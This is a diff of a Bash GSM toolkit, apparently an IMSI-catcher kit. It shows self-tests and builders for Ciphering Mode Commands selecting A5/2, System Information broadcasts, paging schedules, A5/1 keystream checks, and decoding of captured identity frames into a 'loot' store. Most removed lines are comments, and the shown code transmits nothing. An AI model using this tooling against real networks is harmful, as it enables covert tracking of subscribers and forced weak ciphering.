     chk ia-bad-ra-rc    "$(gatk_build_immediate_assignment zz >/dev/null 2>&1; echo $?)" "2"
@@ -3088,8 +2518,6 @@ gatk_selftest() {
     chk ia-subchan-rc   "$(gatk_build_immediate_assignment 0c 0 0 sdcch4 4 >/dev/null 2>&1; echo $?)" "2"
     chk ia-ta-max-rc    "$(gatk_build_immediate_assignment 0c 0 64 >/dev/null 2>&1; echo $?)" "2"
     chk ia-rest-odd-rc  "$(gatk_build_immediate_assignment 0c 0 0 sdcch4 0 62 7 0 0 abc >/dev/null 2>&1; echo $?)" "2"
-    # The FCCH facts and the wire algorithm names were built but unreachable
-    # until this block; both are asserted here so they cannot go dead again
     # silently (see docs/CONFIRMED-BUGS.md item 17).
     chk ia-fcch-offset  "$(fld "$(gatk_fcch_facts)" frequency_offset_khz)" "67.708333"
     chk ia-fcch-guard   "$(fld "$(gatk_fcch_facts)" guard_bits)" "8.25"
@@ -3097,41 +2525,25 @@ gatk_selftest() {
     chk ia-alg-name-3   "$(gatk_alg_name 3)" "A5/4"
     chk ia-alg-name-9   "$(gatk_alg_name 9)" "reserved"
 
-    # 14. Keystream XOR: an all-zero keystream must be the identity.
     chk xor-identity "$(gatk_xor_hex deadbeef "$(printf '0%.0s' {1..32})")" "deadbeef"
     chk xor-invert "$(gatk_xor_hex deadbeef "$(printf '1%.0s' {1..32})")" "21524110"
 
     rm -rf "$d"
-    # ── CIPHERING MODE COMMAND octets ───────────────────────────────────
-    # Adjudicated against Wireshark's gsm_a dissector rather than against this
-    # code: wrapping the message in a GSMTAP frame on UDP 4729 and reading it
-    # back gives "Radio Resources Management (6) / Ciphering Mode Command
-    # (0x35) / SC: Start ciphering (1) / Algorithm identifier: A5/2". That is
-    # the independent check the repo's rule 16 asks for, and it is what caught
-    # the Cipher Response bit.
     chk cms-a52-sc1  "$(gatk_build_cipher_mode A5/2 0)" "06350304"
     chk cms-a51-sc1  "$(gatk_build_cipher_mode A5/1 0)" "06350104"
     chk cms-a53-sc1  "$(gatk_build_cipher_mode A5/3 0)" "06350504"
-    # CR in bit 5, verified: only 0x14 decodes as "CR: IMEISV shall be included".
     chk cms-cr1      "$(gatk_build_cipher_mode A5/2 1)" "06350314"
     chk cms-cr-bits  "$(( 0x$(gatk_build_cipher_mode A5/2 1 | cut -c7-8) & 0x10 ))" "16"
     chk cms-a54-rc   "$(gatk_build_cipher_mode A5/9 >/dev/null 2>&1; echo $?)" "2"
     chk cms-cr-bad   "$(gatk_build_cipher_mode A5/2 2 >/dev/null 2>&1; echo $?)" "2"
-    # Algorithm identifier is 3 bits at 4,3,2 and SC is bit 1, so A5/0 must be
-    # SC=0 - the table has no A5/0 row, which is why A5/1 starts at 000.
     chk cms-alg-a51  "$(gatk_alg_wire_code A5/1)" "0"
     chk cms-alg-a52  "$(gatk_alg_wire_code A5/2)" "1"
     chk cms-alg-a57  "$(gatk_alg_wire_code A5/7)" "6"
 
-    # ── air-interface frame model ───────────────────────────────────────
-    # Every value below is taken from the specification table named in the
-    # comment, not from this code's own output. The frame layer is what the
-    # transmit vectors schedule against, so a wrong offset here moves a forged
-    # message into the wrong timeslot - the failure mode is silent.
     out=$(gatk_fn_split 123456)
-    chk fn-t1   "$(fld "$out" t1)" "93"      # 123456 div 1326, TS 45.002 3.3.2.2.1
-    chk fn-t2   "$(fld "$out" t2)" "8"       # 123456 mod 26
-    chk fn-t3   "$(fld "$out" t3)" "36"      # 123456 mod 51
+    chk fn-t1   "$(fld "$out" t1)" "93"
+    chk fn-t2   "$(fld "$out" t2)" "8"
+    chk fn-t3   "$(fld "$out" t3)" "36"
     chk fn-join "$(gatk_fn_join 93 8 36 | awk -F'\t' '$1=="fn"{print $2}')" "123456"
     out=$(gatk_fn_split 0)
     chk fn0-t1  "$(fld "$out" t1)" "0"
@@ -3142,64 +2554,42 @@ gatk_selftest() {
     chk fn1326-t2 "$(fld "$out" t2)" "0"
     chk fn1326-t3 "$(fld "$out" t3)" "0"
 
-    # TS 45.002 3.3.2.3 a): CCCH_CONF 000 -> 9 CCCH blocks, 001 (combined with
-    # SDCCH/4) -> 3. Getting this wrong makes every paging calculation land on
-    # a frame that carries SDCCH instead of a paging block.
     chk ccch-000 "$(gatk_ccch_conf 000 | awk -F'\t' '$1=="paging_blocks_max"{print $2}')" "9"
     chk ccch-001 "$(gatk_ccch_conf 001 | awk -F'\t' '$1=="paging_blocks_max"{print $2}')" "3"
     chk ccch-comb "$(gatk_ccch_conf 001 | awk -F'\t' '$1=="bs_ccch_sdcch_comb"{print $2}')" "true"
     chk ccch-bad-rc "$(gatk_ccch_conf 011 >/dev/null 2>&1; echo $?)" "2"
 
-    # TS 45.002 table 5: a combined cell has 3 blocks, not 9, and the RACH
-    # frame set shrinks from 51 uplink frames to 27.
     chk rach-noncombined "$(gatk_rach_blocks false | awk -F'\t' '$1=="frame_count"{print $2}')" "51"
     chk rach-combined    "$(gatk_rach_blocks true  | awk -F'\t' '$1=="frame_count"{print $2}')" "27"
 
-    # TS 45.003 3.1.4: the normal burst carries 114 encrypted bits plus TWO
-    # stealing flags. TS 45.002 table 5.2.3-1 describes the same 116 bits as
-    # two 58-bit fields, which is where the common 116-data-bit misreading
-    # comes from.
     out=$(gatk_burst_layout normal)
     chk burst-nb-data-bits "$(fld "$out" data_bits)" "114"
     chk burst-nb-flags     "$(fld "$out" stealing_bits)" "2"
     chk burst-nb-hl        "$(printf '%s\n' "$out" | awk -F'\t' '$1=="stealing" && $2==60{print $2}')" "60"
     chk burst-nb-hu        "$(printf '%s\n' "$out" | awk -F'\t' '$1=="stealing" && $2==87{print $2}')" "87"
     chk burst-nb-tsc       "$(printf '%s\n' "$out" | awk -F'\t' '$1=="training"{print $2}')" "61..86"
-    # TS 45.002 5.2.6: the dummy burst's 142 mixed bits are a fixed constant,
-    # the only standardised known plaintext on the air interface.
     chk burst-db-known "$(gatk_burst_layout dummy | awk -F'\t' '$1=="known_plain_bits"{print $2}')" "142"
     chk burst-db-len   "${#GATK_DB_MIXED_BITS}" "142"
     out=$(gatk_dummy_burst)
     chk dummy-e-bits   "$(fld "$out" encrypted_bits)" "114"
     chk dummy-known    "$(fld "$out" known_plain_bits)" "142"
-    # BN3..BN59 plus BN88..BN144 are the 114 positions a normal burst would
-    # encrypt; between them sit the flag, the 26-bit filling sequence and the
-    # second flag. The filling sequence is asserted as a regression guard on
-    # the boundary, because a one-bit slip there silently corrupts the burst.
     local _e0 _e1
     _e0=$(fld "$out" e0_56); _e1=$(fld "$out" e57_113)
     chk dummy-e-split  "$(( ${#_e0} + ${#_e1} ))" "114"
     chk dummy-e-halves "$([[ ${#_e0} -eq 57 && ${#_e1} -eq 57 ]] && echo '57+57' || echo "${#_e0}+${#_e1}")" "57+57"
     chk dummy-c0-seq   "$(fld "$out" c0_filling_bn61_86)" "01110001011100010111000101"
     chk burst-db-chars "$(printf '%s' "$GATK_DB_MIXED_BITS" | tr -d '01' | wc -c | tr -d ' ')" "0"
-    # The access burst's extended tail and guard are fixed by table 5.2.7-1.
     out=$(gatk_burst_layout access)
     chk burst-ab-tail  "$(printf '%s\n' "$out" | awk -F'\t' '$1=="data"{print $3}')" "36"
     chk burst-ab-guard "$(printf '%s\n' "$out" | awk -F'\t' '$1=="guard"{print $3}')" "68.25"
-    # The sync burst is 39 + 64 + 39 with no stealing flags.
     out=$(gatk_burst_layout sync)
     chk burst-sb-guard "$(printf '%s\n' "$out" | awk -F'\t' '$1=="guard"{print $3}')" "8.25"
     chk burst-sb-tsc   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="training"{print $3}')" "64"
 
-    # TS 45.002 clause 7 table 3: the 51-frame map has five of each of FCCH
-    # and SCH, and nine CCCH blocks, in the non-combined layout.
     out=$(gatk_multiframe_map)
     chk mf-fcch "$(printf '%s\n' "$out" | awk -F'\t' '$2=="FCCH"' | grep -c .)" "5"
     chk mf-sch  "$(printf '%s\n' "$out" | awk -F'\t' '$2=="SCH"' | grep -c .)" "5"
 
-    # TS 45.002 clause 7 table 4: SDCCH/8 sub-channel 0 is DL 0..3 with the
-    # uplink 15..18; SDCCH/4 sub-channel 0 (combined layout) is DL 22..25 with
-    # the uplink 37..40.
     out=$(gatk_sdcch_map 8)
     chk sdcch8-sub0-dl "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="DL"{print $3}')" "0..3"
     chk sdcch8-sub0-ul "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="UL"{print $3}')" "15..18"
@@ -3208,9 +2598,6 @@ gatk_selftest() {
     chk sdcch4-sub0-dl "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="DL"{print $3}')" "22..25"
     chk sdcch4-sub0-ul "$(printf '%s\n' "$out" | awk -F'\t' '$1==0 && $2=="UL"{print $3}')" "37..40"
 
-    # TS 44.006 8.8.3: N201 is 20 on SDCCH and 18 on SACCH in format A/B, and
-    # 21 on SACCH in format Bter. An over-long L3 message is a protocol error,
-    # so the builder must refuse it rather than emit a frame the MS rejects.
     chk n201-sdcch "$(gatk_n201 sdcch  | awk -F'\t' '$1=="n201"{print $2}')" "20"
     chk n201-sacch "$(gatk_n201 sacch  | awk -F'\t' '$1=="n201"{print $2}')" "18"
     chk n201-sacch-bter "$(gatk_n201 sacch bter | awk -F'\t' '$1=="n201"{print $2}')" "21"
@@ -3220,9 +2607,6 @@ gatk_selftest() {
     chk lapdm-overlong-rc \
         "$(gatk_lapdm_ui 0 1 "$(printf '06%.0s' $(seq 25))" >/dev/null 2>&1; echo $?)" "2"
     chk lapdm-at-n201 "$(gatk_lapdm_ui 0 1 "$(printf '06%.0s' $(seq 20))" 0 20 >/dev/null 2>&1; echo $?)" "0"
-    # ── the SMS-DELIVER exchange ───────────────────────────────────────
-    # 7-bit packing of "HELLO" is checked against the bit-by-bit definition
-    # (septets concatenated LSB-first), and the TPDU fields against 23.040.
     gatk_gsm7_pack HELLO >/dev/null
     chk gsm7-septets "$GATK_SEPTETS" "5"
     chk gsm7-refuses "$(gatk_gsm7_pack 'a€b' >/dev/null 2>&1; echo $?)" "2"
@@ -3244,7 +2628,7 @@ gatk_selftest() {
     chk cp-type  "$(printf '%s' "$cp" | cut -c1-2)" "01"
     chk cp-len   "$(( ${#cp} / 2 ))" "$(( (${#rpdata_bytes} + 2) / 2 ))"
     chk lapdm-sabm-hex "$(gatk_lapdm_frame sabm 3 0 | awk -F'\t' '$1=="frame"{print $2}')" "193f"
-    chk lapdm-i-ns2   "$(gatk_lapdm_frame i 3 1 0303 2 0 | awk -F'\t' '$1=="frame"{print $2}')" "1b04110303"
+    chk lapdm-i-ns2   "$(gatk_lapdm_frame i 3 1 0303 2 0 | awk -F'\t' '$1=="frame"{print $2}')" "1b04090303"
     local segs; segs=$(gatk_lapdm_i_segments 3 1 "$(printf 'AA%.0s' $(seq 45))" 0 0)
     chk segments-count "$(fld "$segs" segments)" "3"
     chk segments-m-bit "$(printf '%s\n' "$segs" | awk -F'\t' '$1=="more"{printf "%s", $2}')" "110"
@@ -3260,8 +2644,6 @@ gatk_selftest() {
     chk lapdm-coded    "$(fld "$out" coded_bits)" "456"
     chk lapdm-per-burst "$(fld "$out" bits_per_burst)" "114"
 
-    # TS 45.010 3 and 5.5: one TA step is 48/13 us of round trip, so the cell
-    # radius at TAmax 63 is 63 x 553.46 m. GSM 400 raises TAmax to 219.
     out=$(gatk_ta 63)
     chk ta-bit-us "$(fld "$out" bit_us)" "3.692307692"
     chk ta-max-m  "$(fld "$out" max_one_way_m)" "34868"
@@ -3270,17 +2652,8 @@ gatk_selftest() {
     chk ta-gsm400-rc "$(gatk_ta 219 gsm400 >/dev/null 2>&1; echo $?)" "0"
     chk ta-gsm400-max "$(gatk_ta 219 gsm400 | awk -F'\t' '$1=="max_ta"{print $2}')" "219"
 
-    # SCH payload, TS 45.018 figure 9.1.30a.1 read under the TS 44.004 rule
-    # that bit 1 of an octet is transmitted first. For BSIC 7 (NCC 0, BCC 7)
-    # on SCH frame 1 the 25 bits are: BCC 111 at i2..i4, NCC 000 at i5..i7,
-    # T1 = 0, T2 = 1, T3' = 0. The bit order is the part every implementation
-    # gets wrong, so it is asserted literally, and it was cross-checked
-    # against gr-gsm's decode_sch().
     out=$(gatk_sch_payload 0 1)
     chk sch-bsic-bits "$(fld "$out" sch_bits)" "0000000000000000000001000"
-    # The transmission order is the reverse of each octet. For BSIC 0 on frame
-    # 1 the only set bit is T2's least significant bit, which sits at i18 -
-    # i.e. bit 3 of the third octet, position 21 in the column-order string.
     chk sch-bsic-tx   "$(fld "$out" sch_bits_tx)" "0000000000000000001000000"
     chk sch-bits      "$(fld "$out" sch_info_bits)" "25"
     chk sch-ncc "$(fld "$out" plmn_colour_code)" "0"
@@ -3288,25 +2661,16 @@ gatk_selftest() {
     out=$(gatk_sch_payload 7 11)
     chk sch7-t3p "$(fld "$out" t3p)" "1"
     chk sch7-is-sch "$(fld "$out" input_is_sch_frame)" "yes"
-    # A frame that carries no SCH must be reported as such and fail, not
-    # silently return the decade's SCH frame as though it were the input.
     chk sch-nonsch-rc "$(gatk_sch_payload 7 1234 >/dev/null 2>&1; echo $?)" "1"
     chk sch-nonsch-flag "$(gatk_sch_payload 7 1234 2>/dev/null | awk -F'\t' '$1=="input_is_sch_frame"{print $2}')" "no"
     chk sch-toobig-rc "$(gatk_sch_payload 7 99999999 >/dev/null 2>&1; echo $?)" "2"
     chk sch-bsic63-rc "$(gatk_sch_payload 64 1 >/dev/null 2>&1; echo $?)" "2"
 
-    # The frame clock itself: TS 45.010 5 gives 48/13 us per bit and a
-    # hyperframe of 2715648 frames.
     out=$(gatk_frame_facts)
     chk ff-slot-bits "$(fld "$out" slot_bits)" "156.25"
     chk ff-frame-ms  "$(fld "$out" frame_ms)" "4.615385"
     chk ff-hyper     "$(fld "$out" hyperframe_frames)" "2715648"
 
-    # The System Information the transmit path broadcasts. These assert the
-    # FIELD ARITHMETIC in TS 44.018 9.1.3, not this module's output against
-    # itself: SI1 and SI2 are 21 octets because a 23-octet block behind a
-    # 2-octet LAPDm header has exactly that much room, SI3 is 17 and SI4 is 14
-    # because that is what their field lists add up to.
     local si1 si2 si3 si4
     si1=$(gatk_build_si1 62 | tr -d '\n')
     si2=$(gatk_build_si2 62 | tr -d '\n')
@@ -3316,55 +2680,33 @@ gatk_selftest() {
     chk si2-len  "$(( ${#si2} / 2 ))" "21"
     chk si3-len  "$(( ${#si3} / 2 ))" "17"
     chk si4-len  "$(( ${#si4} / 2 ))" "14"
-    # RR management PD is 0110 and the skip indicator is 0000, so the first
-    # octet is 0x60; the message types are 0x19, 0x1a, 0x1b, 0x1c.
     chk si1-mt "${si1:0:4}" "6019"
     chk si2-mt "${si2:0:4}" "601a"
     chk si3-mt "${si3:0:4}" "601b"
     chk si4-mt "${si4:0:4}" "601c"
-    # LAI inside SI3/SI4 is a bare 5-octet field; the 0x05 IEI belongs only to
-    # the LOCATION UPDATING ACCEPT form gatk_lai_encode returns.
     chk si3-lai "${si3:4:10}" "62f21000f1"
     chk si4-lai "${si4:4:10}" "62f21000f1"
     chk lai-iei "$(gatk_lai_encode 262 01 00f1)" "0562f21000f1"
     chk lai-fld "$(gatk_lai_field 262 01 00f1)" "62f21000f1"
-    # ARFCN 62 in bit map 0 format: octet 8 of the 15, bit 1, so 0x02.
     chk cdb62 "${si1:6:2}" "00"
     chk cdb62-hit "$(gatk_chan_desc_bitmap0 62 | cut -c17-18)" "02"
-    # Control Channel Description: ATT=1 T3212=10, BS_AG_BLKS_RES=2,
-    # CCCH_CONF=1 BS_PA_MFRMS=2.
     chk ccd "$(gatk_ctrl_chan_desc 1 2 2 10 1)" "085228"
-    # A block is 23 octets, and one octet over must be refused rather than
-    # truncated.
     local blk rc
     blk=$(gatk_bcch_frame "$si3"); chk bcch-block-len "$(( ${#blk} / 2 ))" "23"
     ( gatk_bcch_frame "60$(printf '00%.0s' $(seq 1 22))" ) >/dev/null 2>&1
     rc=$?; chk bcch-toobig-rc "$rc" "2"
 
-    # ── cross-checks against 06_gsm_air.sh ──────────────────────────────
-    # Two implementations of the same standards live in this tree: the A5/1
-    # core, the paging arithmetic and the mobile-identity packing. Each was
-    # written to stand alone, because this module must answer whether or not
-    # 06_gsm_air.sh is present. That is the reason for the duplication and the
-    # reason it is dangerous: nothing in either module is obliged to notice the
-    # other drifting. These checks are that obligation, and they run as a
-    # subprocess so the sibling module's CLI, not its source, is the referee.
-    # A tree without the sibling reports SKIP and says so — a skip is never a
-    # pass, and this module never invents a pass for a check it did not run.
     local sib="$IMSISTING_ROOT/modules/06_gsm_air.sh"
     if [[ -r "$sib" ]]; then
         local kc cnt ours theirs
         for kc in 0011223344556677 1223456789abcdef ffffffffffffffff; do
             for cnt in 0 16384; do
-                # Both sides emit packed hex: 228 bits -> 57 octets.
                 ours=$(gatk_a5_1_hex "$kc" "$cnt" 228)
                 theirs=$(bash "$sib" --a5-1-keystream "$kc" 228 "$cnt" 2>/dev/null |
                          awk -F'\t' '$1=="keystream"{print $2; exit}')
                 chk "x-a51-agree-$kc-$cnt" "$ours" "$theirs"
             done
         done
-        # 06 folds BS_AG_BLKS_RES into the block count, this module keeps the
-        # two apart; both must reach the same group, block and CCCH slot.
         local sibpg
         sibpg=$(bash "$sib" --paging-group 262011234567890 2 1 2>/dev/null)
         chk x-page-group  "$(fld "$(gatk_paging_schedule 262011234567890 2 1 8)" paging_group)" \
@@ -3373,19 +2715,68 @@ gatk_selftest() {
                           "$(printf '%s\n' "$sibpg" | awk -F'\t' '$1=="paging_block_index"{print $2}')"
         chk x-page-slot   "$(fld "$(gatk_paging_schedule 262011234567890 2 1 8)" ccch_block)" \
                           "$(printf '%s\n' "$sibpg" | awk -F'\t' '$1=="ccch_slot"{print $2}')"
-        # The identity codec, against the sibling's decoder: the IE this module
-        # builds must decode to the digits the sibling names for it.
         chk x-ident-imsi  "$(bash "$sib" --identity-exposure "$(printf '0609%s' "$(gatk_mobile_identity_imsi 310150123456789 | cut -c5-)")" 2>/dev/null |
                              awk -F'\t' '$1=="imsi"{print $2}')" "310150123456789"
     else
         printf 'SKIP\tx-a51-agree-%s\t06_gsm_air.sh not found under %s\n' "-" "$IMSISTING_ROOT/modules"
     fi
 
+    chk catcher-lapdm-identity \
+        "$(fld "$(gatk_decode_frame '03030d051801' SDCCH)" message)" "IDENTITY REQUEST"
+    chk catcher-lapdm-page-resp \
+        "$(fld "$(gatk_decode_frame '0303090627' SDCCH)" message)" "PAGING RESPONSE"
+    chk catcher-lapdm-form \
+        "$(fld "$(gatk_decode_frame '03030d051801' SDCCH)" form)" "lapdm"
+    chk catcher-lapdm-nolen \
+        "$(fld "$(gatk_decode_frame '0303051801' SDCCH)" message)" "IDENTITY REQUEST"
+    chk catcher-bcch-si3 \
+        "$(fld "$(gatk_decode_frame '15061b000162f2100000' BCCH)" message)" \
+        "SYSTEM INFORMATION TYPE 3"
+    chk catcher-bcch-si3-form \
+        "$(fld "$(gatk_decode_frame '15061b000162f2100000' BCCH)" form)" "bcch"
+    chk catcher-bcch-framed \
+        "$(fld "$(gatk_decode_frame '030315061b000162f2100000' BCCH)" message)" \
+        "SYSTEM INFORMATION TYPE 3"
+    chk catcher-unknown-type \
+        "$(gatk_decode_frame '03030d05ff' SDCCH >/dev/null 2>&1; echo $?)" "3"
+    chk catcher-bad-frame \
+        "$(gatk_decode_frame 'zz' SDCCH >/dev/null 2>&1; echo $?)" "2"
+    chk catcher-step-identity  "$(gatk_catcher_step_of MM 0x18)" "11"
+    chk catcher-step-pagingresp "$(gatk_catcher_step_of RR 0x27)" "9"
+    chk catcher-step-si3       "$(gatk_catcher_step_of RR 0x1B)" "3"
+    chk catcher-step-absent    "$(gatk_catcher_step_of RR 0xFF)" ""
+    local cdir="$d/loot/gsmtap"
+    mkdir -p "$cdir"
+    printf 'frame\ttype\tchannel\tarfcn\tuplink\ttimeslot\tsignal_dbm\tsnr_db\tframe_number\tpayload_len\tpayload_hex\tts_epoch\tts_utc\n' \
+        > "$cdir/decoded.tsv"
+    printf '17\tGSM Um (CS)\tSDCCH\t42\tyes\t3\t-60\t20\t100\t6\t03030d051801\t1700000000\t2023-11-14T22:13:20Z\n' \
+        >> "$cdir/decoded.tsv"
+    gatk_catcher_run_start "selftest-air" >/dev/null 2>&1
+    gatk_catcher_watch >/dev/null 2>&1
+    chk catcher-store-exists "$([[ -s "$(gatk_catcher_store)" ]] && echo yes || echo no)" "yes"
+    chk catcher-store-rows   "$(awk -F'\t' 'NR>1' "$(gatk_catcher_store)" | wc -l)" "1"
+    chk catcher-store-step   "$(awk -F'\t' 'NR>1{print $4; exit}' "$(gatk_catcher_store)")" "11"
+    chk catcher-store-source "$(awk -F'\t' 'NR>1{print $10; exit}' "$(gatk_catcher_store)")" \
+        "gsmtap:store"
+    chk catcher-store-run    "$(awk -F'\t' 'NR>1{print $3; exit}' "$(gatk_catcher_store)")" "selftest-air"
+    chk catcher-progress-seen \
+        "$(gatk_catcher_progress_tsv --run selftest-air | awk -F'\t' '$1==11{print $7}')" "seen"
+    chk catcher-progress-unseen \
+        "$(gatk_catcher_progress_tsv --run selftest-air | awk -F'\t' '$1==1{print $7}')" "unseen"
+    chk catcher-progress-count \
+        "$(gatk_catcher_progress_tsv --run selftest-air | awk -F'\t' 'NR>1' | wc -l)" "14"
+    chk catcher-obs-header \
+        "$(gatk_catcher_observations_tsv --run selftest-air | head -1 | cut -f1-3)" \
+        "$(printf 'ts\tts_epoch\trun')"
+    gatk_catcher_watch >/dev/null 2>&1
+    chk catcher-store-dedup  "$(awk -F'\t' 'NR>1' "$(gatk_catcher_store)" | wc -l)" "1"
+    chk catcher-since-empty  "$(gatk_catcher_watch --since 1800000000 2>&1 | awk -F'\t' '$1=="frames"{print $2}')" "0"
+    chk catcher-missing-capture "$(gatk_catcher_watch "$d/nope.pcap" >/dev/null 2>&1; echo $?)" "1"
+
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
 }
 
-# ── menu ────────────────────────────────────────────────────────────────
 gatk_menu() {
     local c
     while true; do
@@ -3418,7 +2809,7 @@ M
         if [[ -n "${IMSISTING_CLI:-}" ]]; then
             echo "[-] menu unavailable in CLI mode" >&2; return 1
         fi
-        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
+        read -rp "  choice> " c || return 0
         case "$c" in
             1) gatk_cmd_plan imsi-catcher | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
@@ -3504,35 +2895,13 @@ M
     done
 }
 
-# ══════════════════════════════════════════════════════════════════════
-# TX surface (Phase 1): RR/MM message builders, classmark codecs and real
-# GSM cipher implementations.
-#
-# Honest split, restated for this block: the builders below produce the
-# exact octets of a message the network would transmit, and the ciphers
-# produce real keystream. What is still missing is the radio — no burst is
-# formed, no channel coding is applied and nothing is transmitted. Those
-# remain PLAN FILES with `status: handoff`.
-# ══════════════════════════════════════════════════════════════════════
 
-# ── GSM cipher backend ──────────────────────────────────────────────────
-# One python3 process per call, fed the shared core on stdin. python3 is
-# already a hard dependency of the toolkit (00_deps.sh) and is the same
-# backend 06_gsm_air.sh uses for A5/1.
-#
-# The core implements, from the published specifications:
-#   KASUMI         3GPP TS 35.202
-#   f8 / UEA1      3GPP TS 35.201 section 3
-#   f9 / UIA1      3GPP TS 35.201 section 4
-#   KGCORE         3GPP TS 55.216 section 3 (A5/3, A5/4 and GEA3)
-#   A5/2           see the note on gatk_a5_2_bits
-gatk_crypto() {   # <subcommand> [args...]
+gatk_crypto() {
     command -v python3 >/dev/null 2>&1 || {
         printf 'ERROR\tpython3 missing — cannot run the GSM ciphers\n' >&2; return 1; }
     python3 -c "$GATK_CRYPTO_CORE" "$@" || return 1
 }
 
-# The core is defined once, lazily, and cached for the life of the process.
 gatk_crypto_load() {
     [[ -n "${GATK_CRYPTO_CORE:-}" ]] && return 0
     GATK_CRYPTO_CORE=$(cat <<'PYGSM'
@@ -3932,8 +3301,7 @@ PYGSM
     return 0
 }
 
-# ── KASUMI (TS 35.202) ──────────────────────────────────────────────────
-gatk_kasumi() {   # <key-hex-32> <block-hex-16>
+gatk_kasumi() {
     local key; key=$(gatk_norm_hex "${1:-}")
     local blk; blk=$(gatk_norm_hex "${2:-}")
     [[ "$key" =~ ^[0-9a-f]{32}$ ]] || {
@@ -3944,20 +3312,10 @@ gatk_kasumi() {   # <key-hex-32> <block-hex-16>
     gatk_crypto kasumi "$key" "$blk"
 }
 
-# The hex helpers live at the top of the file (same contract as
-# 06_gsm_air.sh: normalise away 0x/spaces/colons/dashes/dots, and treat a
-# string as hex only when it is non-empty, even-length and all hex digits).
-# They used to be defined a second time here with a laxer test that accepted
-# the empty string and odd lengths, which silently disabled the validation
-# every builder below relies on. Do not reintroduce a local copy.
 
-# ── Mobile Station Classmark 1 (TS 24.008 10.5.1.5) ─────────────────────
-# A type 3 information element, 2 octets: IEI 0x33 then one value octet.
-#   octet 2: bit8 = spare (0) | bits7-6 = Revision level | bit5 = ES IND
-#            bit4 = A5/1 supported (INVERTED: 0 = available) | bits3-1 = RF power
 GATK_CLASSMARK1_IEI=0x33
 
-gatk_classmark1_decode() {   # <value-octet-hex>
+gatk_classmark1_decode() {
     local o; o=$(gatk_norm_hex "${1:-}")
     [[ "$o" =~ ^[0-9a-f]{2}$ ]] || {
         printf 'ERROR\tclassmark 1 value octet must be one octet of hex\n' >&2; return 2; }
@@ -4001,26 +3359,18 @@ gatk_classmark1_power() {
     esac
 }
 
-# --classmark1-encode <rev> <power> <es> <a5-1-available>
-gatk_classmark1_encode() {   # <rev0-3> <power0-7> <es0|1> <a51avail0|1>
+gatk_classmark1_encode() {
     local rev="${1:-1}" pwr="${2:-4}" es="${3:-0}" avail="${4:-1}"
     [[ "$rev" =~ ^[0-3]$ ]] || { printf 'ERROR\trevision level must be 0..3\n' >&2; return 2; }
     [[ "$pwr" =~ ^[0-7]$ ]] || { printf 'ERROR\trf power capability must be 0..7\n' >&2; return 2; }
     [[ "$es"  =~ ^[01]$ ]]  || { printf 'ERROR\tes-ind must be 0 or 1\n' >&2; return 2; }
     [[ "$avail" =~ ^[01]$ ]] || { printf 'ERROR\ta5-1-available must be 0 or 1\n' >&2; return 2; }
-    # TS 24.008 figure 10.5.5, bit 1 = LSB: bits 7-6 revision, bit 5 ES IND,
-    # bit 4 A5/1 (0 = available, 1 = not available), bits 3-1 RF power.
     local a51=$(( avail == 1 ? 0 : 1 ))
     local v=$(( ((rev & 3) << 5) | ((es & 1) << 4) | (a51 << 3) | (pwr & 7) ))
     printf '%02x\n' "$v"
 }
 
-# ── Mobile Station Classmark 3 (TS 24.008 10.5.1.7) ─────────────────────
-# A variable-length bit-fields structure. Decoding all ~60 optional fields
-# correctly requires the full figure 10.5.8 ladder; what is implemented here
-# is the definite-length prefix the toolkit can state without guessing, and
-# everything past it is reported as raw remaining bits rather than invented.
-gatk_classmark3_decode() {   # <hex-octets>
+gatk_classmark3_decode() {
     local h; h=$(gatk_norm_hex "${1:-}")
     gatk_is_hex "$h" || { printf 'ERROR\tclassmark 3 must be hex\n' >&2; return 2; }
     (( ${#h} % 2 == 0 )) || { printf 'ERROR\tclassmark 3 must be whole octets\n' >&2; return 2; }
@@ -4036,10 +3386,7 @@ gatk_classmark3_decode() {   # <hex-octets>
     return 0
 }
 
-# ── LAI / Mobile Identity helpers (TS 24.008 10.5.1.3 / 10.5.1.4) ───────
-# LAI is a type 3 IE with 6 octets length: IEI 0x05 + 5 octets carrying
-# MCC and MNC as swapped-nibble BCD, then the 2-octet LAC.
-gatk_lai_encode() {   # <mcc-3digits> <mnc-2or3digits> <lac-hex4>
+gatk_lai_encode() {
     local mcc="${1:-262}" mnc="${2:-01}" lac
     lac=$(gatk_norm_hex "${3:-0000}")
     [[ "$mcc" =~ ^[0-9]{3}$ ]] || { printf 'ERROR\tMCC must be 3 digits\n' >&2; return 2; }
@@ -4049,18 +3396,14 @@ gatk_lai_encode() {   # <mcc-3digits> <mnc-2or3digits> <lac-hex4>
     local n1 n2 n3
     if (( ${#mnc} == 3 )); then n1=${mnc:0:1}; n2=${mnc:1:1}; n3=${mnc:2:1}
     else n1=${mnc:0:1}; n2=${mnc:1:1}; n3=f; fi
-    # octet2 = MCC2 MCC1 ; octet3 = MNC3 MCC3 ; octet4 = MNC2 MNC1
     printf '05%s%s%s%s%s%s%s\n' "$m2" "$m1" "$n3" "$m3" "$n2" "$n1" "$lac"
 }
 
-gatk_lai_decode() {   # <lai-hex-with-iei>
+gatk_lai_decode() {
     local h; h=$(gatk_norm_hex "${1:-}")
     [[ "$h" =~ ^05[0-9a-f]{10}$ ]] || {
         printf 'ERROR\tLAI must be IEI 0x05 plus 5 octets of hex\n' >&2; return 2; }
     local o2=${h:2:2} o3=${h:4:2} o4=${h:6:2} lac=${h:8:4}
-    # Octet 2 = MCC digit 2 | MCC digit 1 (digit 1 in the LOW nibble).
-    # Octet 3 = MNC digit 3 | MCC digit 3.
-    # Octet 4 = MNC digit 2 | MNC digit 1.
     local m1="${o2:1:1}" m2="${o2:0:1}" m3="${o3:1:1}"
     local n3="${o3:0:1}" n2="${o4:0:1}" n1="${o4:1:1}"
     local mcc="${m1}${m2}${m3}"
@@ -4072,30 +3415,17 @@ gatk_lai_decode() {   # <lai-hex-with-iei>
     printf 'lac-dec\t%s\n' "$((16#$lac))"
 }
 
-# Mobile Identity is a type 3 IE. TMSI/P-TMSI form: IEI 0x17, length 0x05,
-# then octet 3 = (odd/even << 3) | type-of-identity, then 4 TMSI octets.
-# Type of identity 100 = TMSI/P-TMSI/M-TMSI.
-gatk_mobile_identity_tmsi() {   # <tmsi-hex8>
